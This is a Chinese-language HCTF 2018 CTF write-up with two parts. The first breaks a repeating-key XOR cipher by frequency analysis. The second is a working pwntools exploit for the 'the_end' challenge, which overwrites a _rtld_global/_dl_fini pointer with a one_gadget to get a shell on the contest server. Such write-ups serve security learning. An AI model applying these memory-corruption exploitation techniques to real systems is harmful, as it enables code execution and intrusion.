# HCTF-xor_game&the_end详细WP

阅读量 **358080**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-11-12 16:00:24

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/dm/1024_576_/t0127a89f3ff5b23218.png)

这次比赛只做出了这两个题，其中我觉的the_end的思路还是可以借鉴一下的。

## xor_game

###  文件分析

题目给出了两个文件一个是加密脚本，一个是加密后输出的文件。打开加密的脚本，就能看出和2017suctf的一个题目很像。

###  加密脚本

    
    
    from Crypto.Util.strxor import strxor
    import base64
    import random
    def enc(data, key):
        key = (key * (len(data) / len(key) + 1))[:len(data)]
    return strxor(data, key)
    
    poem = open('poem.txt', 'r').read()
    flag = "hctf{xxxxxxxxxxx}"
    with open('cipher.txt', 'w') as f:
        f.write(base64.b64encode(enc(poem, flag[5:-1])))
    f.close()
    

###  加密的数据

    
    
    ciMbOQxffx0GHQtSBB0QSQIORihXVQAUOUkHNgQLV
    AQcAVMAAAMCASFEGQYcVS8BNh8BGAoHFlMAABwCTS
    VQC2UdMQx5FkkGEQQAAVMAAQtHRCNLF0NSORscMkk
    aHABSExIYBQseUmBCFgtSKwEWfwELFRcGbzwEDABH
    VS8DDAcXfwUcMQwCDUUBCgYYSQEBATNKGwQeOkkbP
    hsYERYGDB0TYzwCUSVCDE8dKh0BNg4GAAkLSVMWHB
    pHQCxQF08AOhkWPh1OAA0XRQQRBQJKQyVKFghSMA9
    5Gh8LGhEHBB8YEE4UViFaEQEVfwAdfx0GEUUWAAAR
    GxpHTiFQERx4FkkROgUHERMXRTpUCANtYy9RFk8TL
    EkHNwxOFhcbAhsASR0STC1GCk8UMwYEOhsdfiEdRR
    0bHU4QSDRLHR0XO0kGMQ0LEgATERYQSQgORDJaWAs
    XMgYdfxsbGAB4LRYVGxpHUyFXHU8TMQ1TPRsLFREa
    DB0TSRoIASJGGR1SKwEWfwUBFQFSChVUHQYCASNWF
    Q0XLRocMgxkNgoAABd+PRkIKwkDEAoTLQ1TKwELVA
    gHFhoXRU4BUy9OWBsaOkkeMAYAVAQcAVMXCBwEQDN
    Qci4HJwAfNggcDUUXHQcGDAMCASFGCxsaOh0aPAAd
    GUUQBBoASRoIASNCCBsHLQxTMgAdABx4IxoYBQcJR
    mBXEApSNgcHOgcdEUUeDBURRU4FVDQDGQMBMEkVNg
    UCHQsVRQccDE4XVDJGcjsaOhsWfwgcEUUTCQQVEB1
    HTCVOFx0bOhpTKwEcGxAVDRwBHU4TSSUDHQ4AKwF5
    FkkMEQkbAAURSSdHQC0pPAYXO0kSLEkaHABSFAYdD
    BpHQyVCDRsLfwYVfwgbABAfC1MYDA8RRDMpKwcXMQ
    5TNhpOGgoGRRAcCAEUDWBQFQAZOkkUOhoaARcXbzY
    CDABHVilPDE8TMxocfxsLAAQbCxYQSQwITyUDCB0d
    Kg0fJkk/
    HQsVRTURBwlHTDVQGwMXVSYQPBwCAG8mDQERDGQuA
    ShGGR1SMwYFOkVOPUUQAB8dDBgCASlNWAMdKQx5Ew
    YYEUUbFlMVSR4ITiwDFwlSLB0BKg4JGAwcAlMWBRs
    CDCdRHQocfwgfOAgLfiQBRRcRGgELQDRGWAIbPBsc
    cgsbBhYGRRwSSRkOTyQpOgMXOg0aMQ5OAA0ACgYTA
    U4KWGBVHQYcLGMqOggcB0UBERIAAAEJRCQDEQFSKw
    EWfwsLGAwXA3kyBhsVKwkDGgoeNgwFOkkaHAQGRRI
    YBU4EQC4DEAoTLWM2KQwAVAQcERoXAB4GVSUDHAYB
    PBsWKwxCVCxSCBYASRoPRGBMDAcXLUkHNwwHBkUdE
    h1+OgEKRGBAGQFSMQYHfw4cFRYCRQccDE4KTi1GFh
    t4EwwVK0kaG0UGDRZULA8UVWBXF08VMEkkOhoaWEU
    GDRZUDQsGRWBODRwGfwccK0kcEREHFx1UHQFHTy9U
    EAoAOmMgOgxCVCxSEhYVG049QC4DPgMdKAwBLEkBG
    kUfHFMcDA8DDWBKFk8UKgUffwsCGwofRRIYBgAAAT
    RLHU8FPhBTPgUCVBEaAFMDCBdtZzJGCRoXMR0fJkk
    DHRYBABdUGgEKRGwDGhoGfwgfLAZOEAAXFR8NSQMI
    VyVHWA0Lfx4aMQ1CVAMACgAARU4UTy9UWAAAfxsSN
    gdkMgwEAHkkGw8NTyEDKA4APgQaKwhCVBYdCh1UCB
    1HUi9MFk8TLGMfNg8LVAcXRRERCBsTSCZWFE8eNgI
    WfxobGQgXF1MSBQEQRDJQWA4cO0kXOggaHEUeDBgR
    SQ8SVTVOFk8eOggFOhpkNQkBClMXCBwCASFBFxoGf
    x4bPh1OHAQB

###  思路分析

由于key的长度肯定是远远小于给的poem的长度，这样的话进行异或的过程中肯定是会有可以利用统计规律进行计算得出的值（第一次做这样的密码题，让我想起了模仿游戏当中破解德军密码机的时候也是用了这个方法）

###  方法讲述

一、可以利用一个叫做xortools的工具进行一个字频率的一个统计，这样会方便一些在不知道脚本的情况下

二、上面这一步可能中间会有些错误会需要手动修改，于是。。因为suctf见过，就借用了一个师傅的脚本进行了一个快速的解题

😂

###  exp

    
    
     # coding:utf8
     # by https://findneo.github.io/
    def getCipher(file='cipher.txt'):
    '''从文件中读取十六进制串，返回十六进制数组
    '''
        c=''.join(map(lambda x:x.strip(),open('cipher.txt').readlines())).decode('base_64')
        cc= [ord(i) for i in c]
        # print cc,len(cc)
        return cc
        # c = open(file).read()
        # codeintlist = []
        # codeintlist.extend(
        #     (map(lambda i: int(c[i:i + 2], 16), range(0, len(c), 2))))
        # return codeintlist
    
    
    def getKeyPool(cipher, stepSet, plainSet, keySet):
    ''' 传入的密文串、明文字符集、密钥字符集、密钥长度范围均作为数字列表处理.形如[0x11,0x22,0x33]
        返回一个字典，以可能的密钥长度为键，以对应的每一字节的密钥字符集构成的列表为值，密钥字符集为数字列表。
            形如{
                    1:[[0x11]],
                    3:[
                        [0x11,0x33,0x46],
                        [0x22,0x58],
                        [0x33]
                       ]
                }
    '''
        keyPool = dict()
        for step in stepSet:
            maybe = [None] * step
            for pos in xrange(step):
                maybe[pos] = []
                for k in keySet:
                    flag = 1
                    for c in cipher[pos::step]:
                    if c ^ k not in plainSet:
                        flag = 0
                if flag:
                    maybe[pos].append(k)
        for posPool in maybe:
            if len(posPool) == 0:
                maybe = []
                break
        if len(maybe) != 0:
            keyPool[step] = maybe
    return keyPool
    
    
    def calCorrelation(cpool):
    '''传入字典，形如{'e':2,'p':3}
        返回可能性，0~1,值越大可能性越大
        (correlation between the decrypted column letter frequencies and
        the relative letter frequencies for normal English text)
    '''
        frequencies = {"e": 0.12702, "t": 0.09056, "a": 0.08167, "o": 0.07507, "i": 0.06966,
                   "n": 0.06749, "s": 0.06327, "h": 0.06094, "r": 0.05987, "d": 0.04253,
                   "l": 0.04025, "c": 0.02782, "u": 0.02758, "m": 0.02406, "w": 0.02360,
                   "f": 0.02228, "g": 0.02015, "y": 0.01974, "p": 0.01929, "b": 0.01492,
                   "v": 0.00978, "k": 0.00772, "j": 0.00153, "x": 0.00150, "q": 0.00095,
                   "z": 0.00074}
        relative = 0.0
        total = 0
        fpool = 'etaoinshrdlcumwfgypbvkjxqz'
        total = sum(cpool.values())  # 总和应包括字母和其他可见字符
        for i in cpool.keys():
            if i in fpool:
                relative += frequencies[i] * cpool[i] / total
        return relative
    
    
    def analyseFrequency(cfreq):
        key = []
        for posFreq in cfreq:
            mostRelative = 0
        for keyChr in posFreq.keys():
            r = calCorrelation(posFreq[keyChr])
            if r > mostRelative:
                mostRelative = r
                keychar = keyChr
        key.append(keychar)
    
    return key
    
    
    def getFrequency(cipher, keyPoolList):
    ''' 传入的密文作为数字列表处理
        传入密钥的字符集应为列表，依次包含各字节字符集。
            形如[[0x11,0x12],[0x22]]
        返回字频列表，依次为各字节字符集中每一字符作为密钥组成部分时对应的明文字频
            形如[{
                    0x11:{'a':2,'b':3},
                    0x12:{'e':6}
                 },
                 {
                    0x22:{'g':1}
                 }]
    '''
        freqList = []
        keyLen = len(keyPoolList)
        for i in xrange(keyLen):
            posFreq = dict()
            for k in keyPoolList[i]:
                posFreq[k] = dict()
                for c in cipher[i::keyLen]:
                    p = chr(k ^ c)
                    posFreq[k][p] = posFreq[k][p] + 1 if p in posFreq[k] else 1
            freqList.append(posFreq)
        return freqList
    
    
    def vigenereDecrypt(cipher, key):
        plain = ''
        cur = 0
        ll = len(key)
        for c in cipher:
            plain += chr(c ^ key[cur])
            cur = (cur + 1) % ll
        return plain
    
    
    def main():
        ps = []
        ks = []
        ss = []
        ps.extend(xrange(0xff))
        ks.extend(xrange(0x20,0x80))
        ss.extend(xrange(1, 50))
        cipher = getCipher()
    
        keyPool = getKeyPool(cipher=cipher, stepSet=ss, plainSet=ps, keySet=ks)
        for i in keyPool:
            freq = getFrequency(cipher, keyPool[i])
            key = analyseFrequency(freq)
            print ''.join(map(chr,key))
    
    
    if __name__ == '__main__':
        main()
    

给出脚本的链接：<https://findneo.github.io/180527suctf/#Cycle>

###  实现后的图片

![](https://p1.ssl.qhimg.com/t0109c423b662b8b0da.png)

这个图没有截取完整。。要是细心的老师傅应该可以猜的出哪一个是flag->xor_is_interesting!@#加上hctf的头和尾就是flag了。

## the_end

题目叫做the_end,感觉是有那么一点关系，这里大概能对exit有个比较全面的了解。

###  保护查看

![](https://p4.ssl.qhimg.com/t012db5df678f30360d.png)

保护出来canary都开了，这里安利一波pwndbg，可以对开了pie的程序下一个基地址的断点：

b *$rebase(偏移)

###  程序分析

main

![](https://p3.ssl.qhimg.com/t01a681f871f9cb443e.png)

程序的逻辑很简单，首先会给我们一个gift就是sleep的地址这样就可以帮助我们基地址了。然后进入主要的部分一个循环，第一次会对程序进行一个8位的读，第二个读会对我们刚才读进去的8位字节所处的地方进行一个一个字节的写，这个就可以造成任意地址写的一个漏洞了。

###  动态调试

我个人觉得这个题目的关键就在于动态调试程序，因为题目中没有可以给我们过多利用的函数了，只剩下了一个exit()函数，其实开始我并没有什么思路，于是就开始进行了Google，发现了一个类似的题0x00ctf2017-left的题，题目要比这个难，思路上也不太一样，但是有借鉴作用，感兴趣的读者可以看看那个。

###  第一个点

先随意构造输入，然后进入exit函数利用si指令进入每一个函数可以发现一个可能可利用的异常点：

![](https://p3.ssl.qhimg.com/t0106e76b1e91042c8f.png)

图片中有一个call rdx,而rdx来自于rax+0x18

![](https://p5.ssl.qhimg.com/t013239bff9fa211731.png)

这里有一个不像是栈上地址的数，感觉是和后面的ror,xor等有一些关系像是一个解密的操作。这里就可以参考我们上面的所提到的那个题目的思路了。但是这个思路太难利用了所以我想试试能不能有其他的方法，继续调试了下去。

###  第二点

继续往下siyou 可以发现一个call,处在_dl_fini

![](https://p4.ssl.qhimg.com/t013cc02884e5ccdcc6.png)

这个地方调用了rdi+0x216414这个指针，我们查看一下：

![](https://p1.ssl.qhimg.com/t01bcf8f94097650170.png)

这里有一个好像是低三位的一个指针，那大概就是会call这个指针了。。我们可以试试能不能去覆盖这里的指针。当然要先得到偏移，关于这个地址的偏移我是一个
一个试出来的，因为没有几位，应该这个地址段上有些还是不可写的地方。

###  思路分析

两个思路都是在地址上写上我们的one_gadget，写入的地点和方法不同而已。

###  第一个思路

一、就是利用0x00ctf那个思路，利用我们第一次所看见的call rdx进行一个利用

二、先找到initial的值和我们的dl_fini函数进行一个异或得到一个pointer_guard的值

三、将我们的输入进行一次ror和与pointer_guard进行一次异或然后写到initial+0x18的这个段。理论上是可以成功的，但是尼由于太麻烦的原因我并没有去试过，也没有写exp，用的是另一种方法。

###  第二个思路

一、利用dl_fini这里的一个call进行控制程序流

二、写函数_rtld _global+3842这个位置的低字节

三、这个可能有点毒毒就是在cat flag的时候要进行一个cat flag > &0重定向文件流的操作才能看见flag，应该是把stdout关掉了的原因

###  exp

    
    
    from pwn import *
    
    context.log_level='debug'
    e=ELF('./libc64.so')
    #p = process('the_end',env={'LD_PRELOAD':'./libc64.so'})
    p=remote('150.109.44.250',20002)
    raw_input()
    
    
    def get(x):
        return p.recvuntil(x)
    def pu(x):
        p.send(x)
    
    
    get("Input your token:")                       
    p.sendline("qkONSLHkSskPZtfWY6VbMOgV0QKhMoEb")
    
    
    get('here is a gift ')
    base=int(get(',')[:-1],16)-  e.symbols['sleep']
    pass_call=base+0x5f0f48
    one_gadget=(base+0xf02a4)#^(0x1d933f4e14e0cdf4^0x7ffff7de7ab0)
    
    
    for i in range(5):
        pu(p64(pass_call+i))
        pu(p64(one_gadget)[i])
    print hex(one_gadget)
    print(hex(base))
    
    p.recvuntil("good luck ;)")
    p.sendline("cat flag >&0")
    p.interactive()
    

## 总结

hctf题目的质量真的高，做了几个题就做不下去了，但是学到了很多新的姿势还是很满足的。。。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Peanuts** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/163964](/post/id/163964)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [CTF](/tag/CTF)
  * [hctf](/tag/hctf)

 **+1** __5赞

 __收藏

![](https://p0.ssl.qhimg.com/t0150d9dd1f686570ed.jpg) Peanuts

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

